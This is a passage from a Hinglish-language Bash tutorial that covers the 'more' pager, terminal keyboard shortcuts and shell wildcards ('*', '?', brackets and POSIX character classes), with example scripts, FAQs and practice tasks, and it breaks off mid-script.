more /var/log/apache2/access.log

# Specific date se shuru karna
grep "2024-01-15" /var/log/apache2/access.log | more

# Error logs filter karke dekhna
grep -i "error" /var/log/apache2/error.log | more
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `more file` - Page-by-page viewing
- ✅ Space bar - Next page
- ✅ `q` - Quit
- ✅ `/pattern` - Search
- ✅ Piping ke saath use karo

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `more` aur `less` mein kya fark hai?**
A: `less` zyada features hai - backward scroll, better search, faster. `less is more` (pun intended!)

**Q2: Kya main `more` mein backward ja sakta hoon?**
A: Limited support hai. `less` mein easily backward ja sakte hain.

**Q3: File ke beech se kaise shuru karu?**
A: `more +50 file.txt` - line 50 se shuru hoga.

### 14. **Practice ke liye Task**

```bash
# 1. Badi file banao
seq 1 1000 > numbers.txt

# 2. more se dekho
more numbers.txt

# 3. Space bar dabake pages dekho

# 4. q dabake exit karo

# 5. Piping practice
ls -la /usr/bin | more
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📄 `more` badi files ko page-by-page dikhata hai
- ⌨️ Space bar next page, q quit karne ke liye
- 🔍 `/` se text search kar sakte hain
- 📊 Long command outputs ke liye pipe karo
- 💡 Modern systems par `less` prefer karo

> **💡 Ye Zaroor Yaad Rakhein:**
> `more` basic pager hai. Production mein `less` use karo - zyada powerful hai. Yaad rakho: "less is more than more"!

---

## **Topic 4: Terminal Shortcuts (`Ctrl+Shift+C`, `Ctrl+Shift+V`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Terminal Shortcuts** - Copy-paste aur productivity shortcuts terminal mein.

### 2. **Ye Kya Hai? (What is it?)**
Terminal mein kaam karte waqt keyboard shortcuts productivity bahut badha dete hain. Copy-paste, text manipulation, aur navigation shortcuts time bachate hain.

**Analogy:** Socho ki shortcuts aapke tools hain jo manual kaam ko automatic bana dete hain - jaise electric drill manual drill se fast hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Time saving** - Mouse use karne se kaafi faster
- ✅ **Productivity** - Workflow smooth hota hai
- ✅ **Professional work** - Experts shortcuts use karte hain
- ✅ **Efficiency** - Repetitive tasks quickly karo

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Commands copy-paste karni hon
- Long commands edit karni hon
- Terminal history navigate karni ho
- Text quickly manipulate karna ho

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Bahut slow kaam hoga
- Mouse par depend rahoge
- Professional nahi lagoge
- Time waste hoga

### 6. **Syntax aur Common Options**

```bash
# Copy-Paste
Ctrl + Shift + C    # Copy selected text
Ctrl + Shift + V    # Paste

# Text Manipulation
Ctrl + A            # Line ke start par jao
Ctrl + E            # Line ke end par jao
Ctrl + U            # Cursor se pehle sab delete
Ctrl + K            # Cursor ke baad sab delete
Ctrl + W            # Pichla word delete

# Navigation
Ctrl + R            # Command history search
Ctrl + L            # Screen clear (same as clear)
Ctrl + C            # Current command cancel
Ctrl + D            # Exit terminal / EOF

# History
Up Arrow            # Previous command
Down Arrow          # Next command
!!                  # Last command repeat
```

### 7. **Example 1 (Basic)**

```bash
# Long command type kiya
$ sudo apt-get install package-name

# Galti ho gayi, Ctrl+U se poora line delete
# Phir se type karo

# Ya history se Up Arrow dabake previous command lao
# Edit karo aur Enter

# Copy-paste example
# Browser se command copy karo
# Terminal mein Ctrl+Shift+V se paste
```

### 8. **Example 2 (Advanced/Script)**

```bash
# Productivity workflow

# 1. Ctrl+R se purani command search
(reverse-i-search)`docker': docker ps -a

# 2. Ctrl+A se start par jao, sudo add karo
sudo docker ps -a

# 3. Ctrl+E se end par jao, grep add karo
sudo docker ps -a | grep nginx

# 4. !! se last command repeat
$ !!

# 5. !$ se last command ka last argument use karo
$ ls /var/log/nginx/
$ cd !$    # cd /var/log/nginx/
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Ctrl+C aur Ctrl+Shift+C confuse karna:** Ctrl+C command stop karta hai
- ❌ **Mouse use karna:** Keyboard shortcuts faster hain
- ❌ **Shortcuts practice nahi karna:** Muscle memory banana zaroori hai

### 10. **Best Practices / Pro Tips**
- 💡 **Daily practice:** Shortcuts muscle memory ban jayenge
- 💡 **Ctrl+R master karo:** History search bahut powerful hai
- 💡 **Ctrl+A aur Ctrl+E:** Line navigation ke liye best
- 💡 **Tab completion:** Filenames aur commands ke liye

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek sysadmin hain aur quickly commands execute kar rahe hain:

```bash
# Previous command mein sudo bhool gaye
$ systemctl restart apache2
Permission denied

# !! se repeat karo aur sudo add karo
$ sudo !!
# Expands to: sudo systemctl restart apache2

# Status check karo, last argument reuse karo
$ systemctl status !$
# Expands to: systemctl status apache2

# History search
$ Ctrl+R
(reverse-i-search)`apache': sudo systemctl restart apache2
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ Ctrl+Shift+C/V - Copy/Paste
- ✅ Ctrl+A/E - Line start/end
- ✅ Ctrl+R - History search
- ✅ Ctrl+L - Clear screen
- ✅ !! - Repeat last command

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Ctrl+C aur Ctrl+Shift+C mein kya fark hai?**
A: Ctrl+C running command ko stop karta hai. Ctrl+Shift+C text copy karta hai.

**Q2: Middle mouse button kya karta hai?**
A: Selected text automatically paste ho jaata hai (Linux feature).

**Q3: Kya main shortcuts customize kar sakta hoon?**
A: Haan, terminal emulator ki settings mein ja kar.

### 14. **Practice ke liye Task**

```bash
# 1. Long command type karo
echo "This is a very long command that I want to practice with"

# 2. Ctrl+A dabao (start par jao)
# 3. Ctrl+E dabao (end par jao)
# 4. Ctrl+U dabao (sab delete)

# 5. History practice
ls
pwd
date
# Ab Up Arrow dabake previous commands dekho

# 6. Ctrl+R dabake 'ls' search karo

# 7. Copy-paste practice
# Browser se koi command copy karo
# Ctrl+Shift+V se paste karo
```

### 15. **Aakhri Choti Summary (5 lines)**
- ⌨️ Keyboard shortcuts productivity 10x badha dete hain
- 📋 Ctrl+Shift+C/V copy-paste ke liye
- 🔍 Ctrl+R history search ke liye (most powerful!)
- ✂️ Ctrl+U/K text delete ke liye
- 🎯 Daily practice se muscle memory ban jayegi

> **💡 Ye Zaroor Yaad Rakhein:**
> Terminal shortcuts master karna professional Linux user banne ka pehla step hai. Ctrl+R (history search) sabse powerful shortcut hai - isse master karo!

---

# **🎉 Module 2 Complete! 🎉**

Congratulations! Aapne **Module 2: Viewing & Printing Text** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ `echo` command - Text print karna aur formatting
✅ `cat` command - Files ka content dekhna aur concatenate karna
✅ `more` command - Badi files page-by-page dekhna
✅ Terminal shortcuts - Productivity badhaane ke liye

## **Next Steps:**
Ab aap ready hain **Module 3: Pattern Matching (Wildcards)** ke liye!

---

**📝 Practice Reminder:**
Yeh saare commands aur shortcuts daily use karo. Especially terminal shortcuts - yeh muscle memory banana bahut zaroori hai!

---

=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 3)**

---

## **PART 1: THE ABSOLUTE BASICS (Shuruaat)**

---

# **Module 3: Pattern Matching (Wildcards)**

---

## **Topic 1: Star Wildcard (`*`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Star Wildcard (*)** - Ek ya zyada characters ko match karne ke liye powerful pattern.

### 2. **Ye Kya Hai? (What is it?)**
Star wildcard (`*`) ek special character hai jo kisi bhi number of characters (zero se lekar unlimited tak) ko represent karta hai. Yeh file names aur patterns match karne ke liye use hota hai.

**Analogy:** Socho ki `*` ek blank cheque hai jo kisi bhi value ko accept kar sakta hai - zero rupees se lekar crores tak. Similarly, `*` zero characters se lekar unlimited characters tak match kar sakta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Bulk operations** - Ek saath bahut saari files par kaam karna
- ✅ **Time saving** - Har file ka naam type karne ki zaroorat nahi
- ✅ **Pattern matching** - Similar files ko quickly identify karna
- ✅ **Automation** - Scripts mein dynamic file selection

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab similar extension wali files chahiye (*.txt, *.jpg)
- Jab similar naam wali files chahiye (report*, backup*)
- Jab saari files par operation karna ho
- Scripts mein jab file patterns match karne hon

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Har file ka naam manually type karna padega (time waste)
- Bulk operations nahi kar paoge
- Scripts mein flexibility nahi hogi
- Professional automation impossible hoga

### 6. **Syntax aur Common Options**

```bash
# Saari files
*

# Specific extension
*.txt
*.jpg
*.sh

# Specific prefix
report*
backup*
test*

# Specific suffix
*_backup
*_old
*_2024

# Middle pattern
*report*
*backup*
```

**Important Patterns:**
- `*` - Saari files/folders
- `*.ext` - Specific extension wali files
- `prefix*` - Specific prefix se shuru hone wali files
- `*suffix` - Specific suffix se khatam hone wali files
- `*pattern*` - Beech mein pattern wali files

### 7. **Example 1 (Basic)**

```bash
# Saari .txt files list karo
$ ls *.txt
file1.txt  file2.txt  notes.txt

# Saari files jo 'report' se shuru hoti hain
$ ls report*
report_jan.pdf  report_feb.pdf  report_summary.txt

# Saari files jo '_backup' se khatam hoti hain
$ ls *_backup
config_backup  data_backup  script_backup

# Saari files (current directory)
$ ls *
file1.txt  file2.txt  folder1  folder2
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Cleanup script - purani backup files delete karna

BACKUP_DIR="/home/user/backups"
DAYS_OLD=30

echo "Cleaning up old backup files..."

# 30 din se purani .bak files dhoodho aur delete karo
find "$BACKUP_DIR" -name "*.bak" -type f -mtime +$DAYS_OLD -exec rm -v {} \;

# Summary
REMAINING=$(ls -1 "$BACKUP_DIR"/*.bak 2>/dev/null | wc -l)
echo "Cleanup complete! $REMAINING backup files remaining."

# Saari log files ko archive karo
tar -czf logs_archive_$(date +%Y%m%d).tar.gz *.log
echo "All .log files archived!"
```

**Output:**
```
Cleaning up old backup files...
removed '/home/user/backups/old_backup.bak'
removed '/home/user/backups/data_20231215.bak'
Cleanup complete! 5 backup files remaining.
All .log files archived!
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Quotes mein `*` use karna:** `"*.txt"` literally *.txt match karega, expand nahi hoga
- ❌ **Hidden files bhoolna:** `*` hidden files (jo `.` se shuru hoti hain) match nahi karta
- ❌ **Dangerous commands:** `rm -rf *` current directory ki sab kuch delete kar dega!

### 10. **Best Practices / Pro Tips**
- 💡 **Pehle test karo:** `ls *.txt` se dekho kya match ho raha hai, phir `rm *.txt` karo
- 💡 **Double quotes use karo:** Variables ke saath: `"$DIR"/*.txt`
- 💡 **Hidden files ke liye:** `.*` use karo (but careful - `.` aur `..` bhi match honge)
- 💡 **Combine patterns:** `*.{txt,log,bak}` multiple extensions ek saath

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek web developer hain aur aapko project mein saari image files ko optimize karna hai:

```bash
#!/bin/bash
# Image optimization script

IMG_DIR="./images"
OUTPUT_DIR="./images/optimized"

mkdir -p "$OUTPUT_DIR"

echo "Optimizing images..."

# Saari .jpg files optimize karo
for img in "$IMG_DIR"/*.jpg; do
    filename=$(basename "$img")
    convert "$img" -quality 85 "$OUTPUT_DIR/$filename"
    echo "Optimized: $filename"
done

# Saari .png files optimize karo
for img in "$IMG_DIR"/*.png; do
    filename=$(basename "$img")
    pngquant --quality=65-80 "$img" --output "$OUTPUT_DIR/$filename"
    echo "Optimized: $filename"
done

echo "All images optimized!"
```

Yeh script automatically saari images ko process kar dega.

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `*` kisi bhi number of characters ko match karta hai
- ✅ `*.ext` specific extension wali files
- ✅ `prefix*` specific prefix wali files
- ✅ `*suffix` specific suffix wali files
- ✅ Pehle `ls` se test karo, phir dangerous commands use karo

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `*` aur `.*` mein kya fark hai?**
A: `*` normal files match karta hai. `.*` hidden files (jo `.` se shuru hoti hain) match karta hai.

**Q2: Kya `*` folders ko bhi match karta hai?**
A: Haan! `*` files aur folders dono ko match karta hai. Sirf files chahiye toh `find` command use karo.

**Q3: Agar koi file match nahi hui toh kya hoga?**
A: By default, `*` literally print ho jayega. `shopt -s nullglob` set karne se empty list milegi.

### 14. **Practice ke liye Task**

```bash
# 1. Test files banao
touch file1.txt file2.txt file3.txt
touch report_jan.pdf report_feb.pdf
touch data_backup config_backup

# 2. Saari .txt files list karo
ls *.txt

# 3. 'report' se shuru hone wali files
ls report*

# 4. '_backup' se khatam hone wali files
ls *_backup

# 5. Saari files count karo
ls * | wc -l

# 6. Cleanup
rm *.txt report* *_backup
```

### 15. **Aakhri Choti Summary (5 lines)**
- ⭐ `*` sabse powerful wildcard hai - kisi bhi characters ko match karta hai
- 📁 `*.ext` specific file types ke liye perfect
- 🎯 Bulk operations ke liye essential tool
- ⚠️ Dangerous commands se pehle HAMESHA test karo
- 🔒 Quotes aur proper paths use karo safety ke liye

> **💡 Ye Zaroor Yaad Rakhein:**
> Star wildcard (`*`) bahut powerful hai lekin dangerous bhi! Hamesha pehle `ls` se verify karo kya match ho raha hai, phir hi `rm` ya `mv` jaise commands use karo!

---

## **Topic 2: Question Mark Wildcard (`?`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Question Mark Wildcard (?)** - Exactly ek character ko match karne ke liye precise pattern.

### 2. **Ye Kya Hai? (What is it?)**
Question mark wildcard (`?`) exactly ek single character ko represent karta hai - na zyada, na kam. Yeh `*` se zyada specific hai kyunki yeh sirf ek character match karta hai.

**Analogy:** Socho ki `?` ek blank space hai crossword puzzle mein - exactly ek letter ki jagah hai, na zyada na kam. `*` ek elastic band hai jo kitna bhi stretch ho sakta hai, lekin `?` ek fixed size ka box hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Precise matching** - Exact length wali files match karna
- ✅ **Pattern specificity** - `*` se zyada control
- ✅ **Numbered files** - file1, file2, file3 jaise patterns
- ✅ **Fixed format files** - Date formats, codes, IDs

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab file names ki length fixed ho
- Jab specific positions par characters vary karte hon
- Numbered sequences match karne ke liye
- Date formats ya codes match karne ke liye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- `*` use karke unwanted files bhi match ho jayengi
- Precise patterns nahi bana paoge
- Fixed-length file names handle karna mushkil hoga
- Automation mein accuracy kam hogi

### 6. **Syntax aur Common Options**

```bash
# Exactly ek character
file?.txt        # file1.txt, fileA.txt (NOT file10.txt)

# Multiple positions
file??.txt       # file01.txt, fileAB.txt

# Specific pattern
data_????.csv    # data_2024.csv, data_test.csv

# Mixed with other patterns
report_202?_??.pdf   # report_2024_01.pdf
```

**Important Patterns:**
- `?` - Exactly 1 character
- `??` - Exactly 2 characters
- `???` - Exactly 3 characters
- `file?.txt` - file + 1 char + .txt
- `????-??-??` - Date format (YYYY-MM-DD)

### 7. **Example 1 (Basic)**

```bash
# Single digit files
$ ls file?.txt
file1.txt  file2.txt  file3.txt

# Two digit files
$ ls file??.txt
file10.txt  file11.txt  file99.txt

# Date pattern (YYYY-MM-DD)
$ ls log_????-??-??.txt
log_2024-01-15.txt  log_2024-01-16.txt

# Mixed pattern
$ ls report_?.pdf
report_A.pdf  report_B.pdf  report_1.pdf
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Backup files ko date-wise organize karna

BACKUP_DIR="/backups"
ARCHIVE_DIR="/backups/archive"

mkdir -p "$ARCHIVE_DIR"

echo "Organizing backup files..."

# YYYY-MM-DD format wali files dhoodho
for file in "$BACKUP_DIR"/backup_????-??-??.tar.gz; do
    if [ -f "$file" ]; then
        # Date extract karo (YYYY-MM)
        filename=$(basename "$file")
        year_month=$(echo "$filename" | grep -oP '\d{4}-\d{2}')
        
        # Month folder banao
        mkdir -p "$ARCHIVE_DIR/$year_month"
        
        # File move karo
        mv -v "$file" "$ARCHIVE_DIR/$year_month/"
    fi
done

echo "Organization complete!"

# Summary
echo "Files organized by month:"
du -sh "$ARCHIVE_DIR"/*
```

**Output:**
```
Organizing backup files...
'backup_2024-01-15.tar.gz' -> 'archive/2024-01/backup_2024-01-15.tar.gz'
'backup_2024-01-16.tar.gz' -> 'archive/2024-01/backup_2024-01-16.tar.gz'
Organization complete!
Files organized by month:
1.2G    archive/2024-01
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`?` aur `*` confuse karna:** `file?.txt` sirf file1.txt match karega, file10.txt nahi
- ❌ **Zero characters expect karna:** `?` exactly 1 character chahiye, zero nahi
- ❌ **Path separators:** `?` forward slash (/) match nahi karta

### 10. **Best Practices / Pro Tips**
- 💡 **Counting characters:** Jitne `?` utne characters - `???` = exactly 3
- 💡 **Combine with `*`:** `file?_*.txt` - file + 1 char + underscore + anything + .txt
- 💡 **Date patterns:** `????-??-??` standard date format ke liye
- 💡 **Testing:** `echo file?.txt` se pehle dekho kya match ho raha hai

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek system administrator hain aur daily log files ko process karna hai jo specific format mein hain:

```bash
#!/bin/bash
# Daily log processor

LOG_DIR="/var/log/app"
TODAY=$(date +%Y-%m-%d)

echo "Processing today's logs: $TODAY"

# Aaj ki saari hourly logs (format: app_2024-01-15_HH.log)
for log in "$LOG_DIR"/app_${TODAY}_??.log; do
    if [ -f "$log" ]; then
        echo "Processing: $(basename "$log")"
        
        # Errors count karo
        error_count=$(grep -c "ERROR" "$log")
        echo "  Errors found: $error_count"
        
        # Agar errors hain toh alert
        if [ "$error_count" -gt 0 ]; then
            echo "  ⚠️  Alert: Errors detected!"
            grep "ERROR" "$log" >> /tmp/error_summary.txt
        fi
    fi
done

echo "Log processing complete!"
```

Yeh script automatically aaj ki saari hourly logs ko process karega.

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `?` exactly ek character match karta hai
- ✅ `??` exactly do characters, `???` exactly teen
- ✅ Fixed-length patterns ke liye perfect
- ✅ `*` se zyada precise control
- ✅ Date formats aur codes ke liye ideal

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `?` aur `*` mein main fark kya hai?**
A: `?` exactly 1 character match karta hai. `*` zero se unlimited characters match karta hai.

**Q2: Kya `?` hidden files match karta hai?**
A: Nahi, agar file `.` se shuru hoti hai toh explicitly `.?` use karna padega.

**Q3: Kya main `?` ko escape kar sakta hoon?**
A: Haan, `\?` ya `'?'` use karo agar literal question mark chahiye.

### 14. **Practice ke liye Task**

```bash
# 1. Test files banao
touch file1.txt file2.txt file3.txt
touch file10.txt file11.txt
touch log_2024-01-15.txt log_2024-01-16.txt

# 2. Single digit files
ls file?.txt

# 3. Two digit files
ls file??.txt

# 4. Date pattern files
ls log_????-??-??.txt

# 5. Difference dekho
ls file*.txt    # Saari files
ls file?.txt    # Sirf single digit

# 6. Cleanup
rm file*.txt log*.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- ❓ `?` exactly ek character ke liye placeholder
- 🎯 Fixed-length patterns ke liye perfect tool
- 📅 Date formats aur codes match karne ke liye ideal
- 🔢 Numbered sequences precisely handle karta hai
- ⚖️ `*` se zyada control, kam flexibility

> **💡 Ye Zaroor Yaad Rakhein:**
> Question mark (`?`) precision ka tool hai! Jab exact length pata ho, tab `?` use karo. Jab variable length ho, tab `*` use karo!

---

## **Topic 3: Bracket Wildcards (`[ ]`, `[abc]`, `[!abc]`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Bracket Wildcards** - Specific characters ya character ranges ko match karne ka surgical tool.

### 2. **Ye Kya Hai? (What is it?)**
Bracket wildcards (`[ ]`) aapko exactly specify karne dete hain ki kaunse characters match hone chahiye. Yeh `?` se bhi zyada precise hai kyunki aap exact characters choose kar sakte hain.

**Analogy:** Socho ki aap ek restaurant mein hain. `*` ka matlab "kuch bhi khilao", `?` ka matlab "koi ek dish do", lekin `[abc]` ka matlab "sirf A, B, ya C dish do - aur kuch nahi!"

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Character-level control** - Exact characters specify karna
- ✅ **Range matching** - [0-9], [a-z] jaise ranges
- ✅ **Exclusion** - [!abc] specific characters ko exclude karna
- ✅ **Complex patterns** - Bahut specific file matching

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab specific characters wali files chahiye
- Jab ranges match karne hon (numbers, letters)
- Jab kuch characters ko exclude karna ho
- Case-sensitive matching chahiye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Complex patterns nahi bana paoge
- Unwanted files match ho jayengi
- Precise filtering nahi kar paoge
- Advanced automation limited rahega

### 6. **Syntax aur Common Options**

```bash
# Specific characters
[abc]           # a, b, ya c
[123]           # 1, 2, ya 3

# Ranges
[a-z]           # a se z tak koi bhi lowercase letter
[A-Z]           # A se Z tak koi bhi uppercase letter
[0-9]           # 0 se 9 tak koi bhi digit

# Negation (NOT)
[!abc]          # a, b, c KE ALAWA koi bhi character
[!0-9]          # Digit KE ALAWA koi bhi character

# Combined
[a-zA-Z]        # Koi bhi letter (upper ya lower)
[0-9a-f]        # Hexadecimal digits
```

**Important Patterns:**
- `file[123].txt` - file1.txt, file2.txt, file3.txt
- `file[0-9].txt` - file0.txt se file9.txt tak
- `file[!0-9].txt` - fileA.txt, fileB.txt (digits nahi)
- `[A-Z]*.txt` - Capital letter se shuru hone wali files

### 7. **Example 1 (Basic)**

```bash
# Specific numbers
$ ls file[123].txt
file1.txt  file2.txt  file3.txt

# Range of numbers
$ ls file[0-9].txt
file0.txt  file1.txt  file2.txt  ...  file9.txt

# Lowercase letters
$ ls file[a-c].txt
filea.txt  fileb.txt  filec.txt

# NOT digits
$ ls file[!0-9].txt
filea.txt  fileb.txt  fileX.txt

# Capital letters se shuru
$ ls [A-Z]*.txt
Apple.txt  Banana.txt  Zebra.txt
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Grade-wise student files organize karna

STUDENT_DIR="/data/students"
GRADE_DIR="/data/grades"

mkdir -p "$GRADE_DIR"/{A,B,C,D,F}

echo "Organizing student files by grade..."

# Grade A students (90-100)
for file in "$STUDENT_DIR"/student_[9][0-9]_*.txt; do
    [ -f "$file" ] && mv -v "$file" "$GRADE_DIR/A/"
done

# Grade B students (80-89)
for file in "$STUDENT_DIR"/student_[8][0-9]_*.txt; do
    [ -f "$file" ] && mv -v "$file" "$GRADE_DIR/B/"
done

# Grade C students (70-79)
for file in "$STUDENT_DIR"/student_[7][0-9]_*.txt; do
    [ -f "$file" ] && mv -v "$file" "$GRADE_DIR/C/"
done

# Grade D students (60-69)
for file in "$STUDENT_DIR"/student_[6][0-9]_*.txt; do
    [ -f "$file" ] && mv -v "$file" "$GRADE_DIR/D/"
done

# Grade F students (below 60)
for file in "$STUDENT_DIR"/student_[0-5][0-9]_*.txt; do
    [ -f "$file" ] && mv -v "$file" "$GRADE_DIR/F/"
done

echo "Organization complete!"

# Summary
for grade in A B C D F; do
    count=$(ls -1 "$GRADE_DIR/$grade" 2>/dev/null | wc -l)
    echo "Grade $grade: $count students"
done
```

**Output:**
```
Organizing student files by grade...
'student_95_john.txt' -> 'grades/A/student_95_john.txt'
'student_87_sarah.txt' -> 'grades/B/student_87_sarah.txt'
Organization complete!
Grade A: 5 students
Grade B: 8 students
Grade C: 12 students
Grade D: 6 students
Grade F: 3 students
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Spaces dena:** `[a, b, c]` galat - `[abc]` sahi
- ❌ **Multiple characters expect karna:** `[abc]` sirf EK character match karta hai
- ❌ **Range order galat:** `[z-a]` kaam nahi karega, `[a-z]` sahi hai

### 10. **Best Practices / Pro Tips**
- 💡 **Ranges combine karo:** `[a-zA-Z0-9]` alphanumeric characters
- 💡 **Negation powerful hai:** `[!0-9]` non-digits ke liye
- 💡 **Case sensitivity:** `[a-z]` aur `[A-Z]` alag hain
- 💡 **Testing:** `echo file[0-9].txt` se pehle test karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek data analyst hain aur CSV files ko process karna hai jo specific naming convention follow karti hain:

```bash
#!/bin/bash
# CSV data processor - sirf valid format wali files

DATA_DIR="/data/csv"
PROCESSED_DIR="/data/processed"
ERROR_DIR="/data/errors"

mkdir -p "$PROCESSED_DIR" "$ERROR_DIR"

echo "Processing CSV files..."

# Valid format: data_[A-Z][0-9][0-9][0-9].csv
# Example: data_A001.csv, data_Z999.csv

for file in "$DATA_DIR"/data_[A-Z][0-9][0-9][0-9].csv; do
    if [ -f "$file" ]; then
        filename=$(basename "$file")
        echo "Processing: $filename"
        
        # Validate CSV structure
        if head -1 "$file" | grep -q "id,name,value"; then
            # Process file
            awk -F',' '{sum+=$3} END {print "Total:", sum}' "$file" > "$PROCESSED_DIR/${filename%.csv}_summary.txt"
            echo "  ✓ Processed successfully"
        else
            echo "  ✗ Invalid CSV structure"
            mv "$file" "$ERROR_DIR/"
        fi
    fi
done

echo "Processing complete!"
echo "Processed: $(ls -1 "$PROCESSED_DIR" | wc -l) files"
echo "Errors: $(ls -1 "$ERROR_DIR" 2>/dev/null | wc -l) files"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `[abc]` specific characters match karta hai
- ✅ `[a-z]` ranges define karta hai
- ✅ `[!abc]` negation - specified characters KE ALAWA
- ✅ `[0-9]` digits, `[a-zA-Z]` letters
- ✅ Sirf EK character match hota hai per bracket

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `[abc]` aur `{a,b,c}` mein kya fark hai?**
A: `[abc]` ek character match karta hai (a YA b YA c). `{a,b,c}` brace expansion hai jo teen alag strings banata hai.

**Q2: Kya main multiple brackets use kar sakta hoon?**
A: Haan! `file[0-9][0-9].txt` do digits match karega: file00.txt se file99.txt tak.

**Q3: `[!abc]` kaise kaam karta hai?**
A: Yeh negation hai - a, b, c KE ALAWA koi bhi ek character match karega.

### 14. **Practice ke liye Task**

```bash
# 1. Test files banao
touch file1.txt file2.txt file3.txt file9.txt
touch filea.txt fileb.txt fileX.txt
touch File1.txt File2.txt

# 2. Specific numbers
ls file[123].txt

# 3. Range of numbers
ls file[0-9].txt

# 4. Letters only
ls file[a-z].txt

# 5. NOT numbers
ls file[!0-9].txt

# 6. Capital letters
ls [A-Z]*.txt

# 7. Cleanup
rm file*.txt File*.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🎯 Brackets character-level precision dete hain
- 📊 Ranges (`[0-9]`, `[a-z]`) bahut powerful hain
- 🚫 Negation (`[!abc]`) exclusion ke liye
- 🔤 Case-sensitive matching possible hai
- 💡 Complex patterns banane ka foundation

> **💡 Ye Zaroor Yaad Rakhein:**
> Bracket wildcards surgical precision dete hain! `[0-9]` digits ke liye, `[a-z]` lowercase letters ke liye, aur `[!...]` exclusion ke liye yaad rakho!

---

## **Topic 4: Character Classes (`[[:alpha:]]`, `[[:digit:]]`, `[[:lower:]]`, `[[:upper:]]`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Character Classes** - Predefined character sets jo portable aur reliable hain.

### 2. **Ye Kya Hai? (What is it?)**
Character classes POSIX standard ke predefined sets hain jo specific types of characters ko represent karte hain. Yeh `[a-z]` se zyada reliable hain kyunki yeh locale-aware hain aur har system par same kaam karte hain.

**Analogy:** Socho ki `[a-z]` ek handwritten list hai jo galat ho sakti hai, lekin `[[:lower:]]` ek printed, certified list hai jo hamesha sahi hogi - chahe koi bhi language ya system ho.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Portability** - Har Unix/Linux system par same kaam karte hain
- ✅ **Locale-aware** - Different languages support karte hain
- ✅ **Reliability** - `[a-z]` se zyada bharosemand
- ✅ **Readability** - Code zyada clear aur self-documenting

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Production scripts mein (portability ke liye)
- International applications mein
- Jab locale-specific characters chahiye
- Professional code likhte waqt

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Scripts different systems par fail ho sakti hain
- Locale issues aa sakte hain
- International characters miss ho sakte hain
- Code less portable hoga

### 6. **Syntax aur Common Options**

```bash
# Alphabetic characters
[[:alpha:]]     # Saare letters (a-z, A-Z)

# Digits
[[:digit:]]     # 0-9

# Alphanumeric
[[:alnum:]]     # Letters + digits

# Lowercase
[[:lower:]]     # a-z (locale-aware)

# Uppercase
[[:upper:]]     # A-Z (locale-aware)

# Whitespace
[[:space:]]     # Space, tab, newline

# Punctuation
[[:punct:]]     # Punctuation characters

# Printable
[[:print:]]     # Printable characters

# Hexadecimal
[[:xdigit:]]    # 0-9, a-f, A-F
```

**Common Character Classes:**
- `[[:alpha:]]` - Letters
- `[[:digit:]]` - Numbers
- `[[:alnum:]]` - Letters + Numbers
- `[[:lower:]]` - Lowercase letters
- `[[:upper:]]` - Uppercase letters
- `[[:space:]]` - Whitespace

### 7. **Example 1 (Basic)**

```bash
# Alphabetic characters se shuru hone wali files
$ ls [[:alpha:]]*.txt
apple.txt  Banana.txt  zebra.txt

# Digits se shuru hone wali files
$ ls [[:digit:]]*.txt
1file.txt  2file.txt  9file.txt

# Lowercase se shuru hone wali files
$ ls [[:lower:]]*.txt
apple.txt  banana.txt  zebra.txt

# Uppercase se shuru hone wali files
$ ls [[:upper:]]*.txt
Apple.txt  Banana.txt  Zebra.txt
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# File validator - naming convention check karna

UPLOAD_DIR="/uploads"
VALID_DIR="/uploads/valid"
